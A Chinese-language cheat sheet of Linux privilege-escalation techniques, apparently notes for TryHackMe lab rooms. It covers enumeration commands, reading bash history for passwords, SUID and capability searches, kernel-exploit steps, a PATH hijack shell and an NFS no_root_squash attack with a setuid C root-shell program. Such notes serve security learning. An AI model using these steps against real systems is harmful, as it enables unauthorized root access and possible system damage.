# 1，枚举

## 主机名
>hostname

## 系统信息
>uname -a

## 内核版本和其他数据信息
>cat /proc/version

## 系统和版本
>cat /etc/issue

## PS命令
查看 Linux 系统上正在运行的进程
>ps


* PID：进程ID（进程唯一）
* TTY：用户使用的终端类型
* TIME：进程使用的 CPU 时间量（这不是该进程运行的时间）
* CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）


>ps -A: 查看所有正在运行的进程

>ps axjf：查看进程树（查看树的形成直到ps axjf下面运行）


>ps aux：aux 选项将显示所有用户的进程 (a)，显示启动进程的用户 (u)，并显示未连接到终端的进程 (x)。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。

## env命令

显示所有环境变量
尤其关注```$PATH```，可用户权限提升

## sudo -l
列出所有可以用root（或者其他用户）身份执行的命令

## ls
显示所有文件（包括隐藏文件）的详细信息
>ls -alh

## id
显示用户级别和组成员身份

注意：```id + 用户名```可以显示该用户的用户级别和组成员身份

## /etc/passwd
用于发现linux上的系统用户

## history
浏览用户之前使用过的bash历史命令，有可能会暴露用户密码等敏感信息

## ifconfig
查看网络接口和网络配置等信息
也可以使用```ip route```查看网络路由等信息

## netstat
显示所有连接信息

* netstat -a: 显示所有侦听端口和已建立的连接。
* netstat -at或者 netstat -au也可以分别用于列出TCP或 UDP 协议。
* netstat -l: 以“侦听”模式列出端口。这些端口已打开并准备好接受传入连接。
* netstat -s: 按协议列出网络使用统计信息（如下） 这也可以与-t 或-u 选项一起使用以将输出限制为特定协议。
* netstat -tp: 列出带有服务名称和 PID 信息的连接。
* netstat -i：显示接口统计信息
* netstat 您可能在博客文章、文章和课程中最常看到 的用法netstat -ano 可以细分如下：

-a: 显示所有插座
-n: 不解析名称
-o: 显示计时器

## find命令

* find . -name flag1.txt: 在当前目录中找到名为“flag1.txt”的文件
* find /home -name flag1.txt: 在/home目录下找到文件名“flag1.txt”
* find / -type d -name config: 在“/”下找到名为config的目录
* find / -type f -perm 0777: 查找具有 777 权限的文件（所有用户可读、可写和可执行的文件）
* find / -perm a=x: 查找可执行文件
* find /home -user frank: 在“/home”下找到用户“frank”的所有文件
* find / -mtime 10: 查找最近 10 天内修改过的文件
* find / -atime 10: 查找过去 10 天内访问过的文件
* find / -cmin -60：查找在过去一小时（60 分钟）内更改的文件
* find / -amin -60: 查找最近一小时（60 分钟）内的文件访问
* find / -size 50M: 查找大小为 50 MB 的文件 （此命令还可以与 (+) 和 (-) 符号一起使用，以指定大于或小于给定大小的文件。）
* find / -group apache  apache用户组文件

>“find”命令往往会产生错误，这有时会使输出难以阅读。这就是为什么明智的做法是使用带有“-type f 2>/dev/null”的“find”命令将错误重定向到“/dev/null”并获得更清晰的输出

### 查找可写文件夹
* find / -writable -type d 2>/dev/null : Find world-writeable folders
* find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
* find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

### 查找可执行文件夹
* find / -perm -o x -type d 2>/dev/null : Find world-executable folders


### 查找所有SUID
* find / -perm -u=s -type f 2>/dev/null

## 其他命令
>locate, grep, cut, sort

# 2，自动化linux提权枚举脚本

* LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* LinEnum: https://github.com/rebootuser/LinEnum
* LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
* Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
* Linux Priv Checker: https://github.com/linted/linuxprivchecker

# 3，内核漏洞利用

## 内核漏洞利用方法
> 1. 识别内核版本
> 2. 搜索并找到目标系统内核版本的漏洞利用代码
> 3 .运行漏洞利用

## 如何寻找漏洞
> 1. 谷歌搜索漏洞利用代码
> 2. https://tryhackme.com/room/linprivesc
> 3. 漏洞枚举脚本（上面的LES）

## 要注意什么？
> 1. 在谷歌、Exploit-db 或 searchsploit 搜索漏洞时要确认系统内核版本。
> 2. 可能会对系统造成破坏，真实环境需要注意。
> 3. 漏洞利用进行的时候有可能需要进一步的交互，阅读随漏洞利用代码提供的所有注释和说明。
> 4. 利用python和wget把exp传输到目标系统。

## 风险
内核漏洞提权可能会引起系统崩溃或者其他不可修复的破坏，因此在现实环境中要注意这一点，应该作为最后的提权手段。

# 4，Sudo
列出所有以root身份运行的命令
> sudo -l

## 资源
[gtfobins](https://gtfobins.github.io/)

# 5，SUID

列出设置了 SUID 或 SGID 位的文件
> find / -type f -perm -04000 -ls 2>/dev/null


# 6，Capabilities(能力)

列出已启用的功能
> getcap -r / 2>/dev/null

注意这个值：```cap_setuid```

根据显示的功能到[gtfobins](https://gtfobins.github.io/)查找对应的```Capabilities```的提权方法


# 7，Cron

思路：
如果有一个以 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行

查看Cron任务：
> /etc/crontab

# 8，PATH

路径提权需要结合SUID进行

## 步骤

1. 查看当前环境变量PATH：
> echo $PATH

2. 查找系统可写文件夹以便加入到$PATH（一般选择/tmp或者当前用户家目录）
> find / -writable 2>/dev/null

3. 把某个目录加入到$PATH
> export PATH=/tmp:$PATH

4. 把下面shell写进需要劫持的命令：
```
#!/bin/bash
/bin/bash -p
```

5. 执行劫持的命令，，获得root权限

# 9，NFS

## 思路
1. NFS（网络文件共享）配置保存在 ```/etc/exports``` 文件中。该文件是在 NFS 服务器安装期间创建的，通常可以由用户读取
查看：
> cat  /etc/exports

2. 关键元素是可以在上面看到的```no_root_squash```选项
3. 默认情况下，NFS 会将 root 用户更改为 nfsnobody 并剥夺任何文件以 root 权限运行。如果“no_root_squash”选项存在于可写共享中，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它.

简单点来说就是因为靶机的错误分享配置，导致攻击机挂载上去以后创建的任何文件都能够以root的身份和权限运行。

## 步骤
1. 在靶机查看 ```/etc/exports```
> cat /etc/exports

2. 检查上面分享文件是否存在```no_root_squash```选项

3. 在攻击机查看靶机的分享目录
> showmount -e 靶机IP

4. 在攻击机```/tmp/```目录下创建一个文件夹
> mkdir /tmp/expnfs

5. 把靶机有```no_root_squash```选项的文件夹挂载到攻击机上
> mount -o rw 靶机IP：/靶机共享文件夹  /tmp/expnfs  
> 例子：mount -o rw 10.0.2.12:/backups  /tmp/expnfs)

6. 创建一个c程序，把如下代码写进去。（奇怪的是创建一个shell脚本是不行的。。）
```
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}

```

7. 在攻击机挂载目录上编译上面的c程序
```
gcc nfs.x -o nfs -w
```

8. 此时回到靶机的分享目录，就可以看见上面的nfs二进制文件，并且具有SUID权限，执行即可提权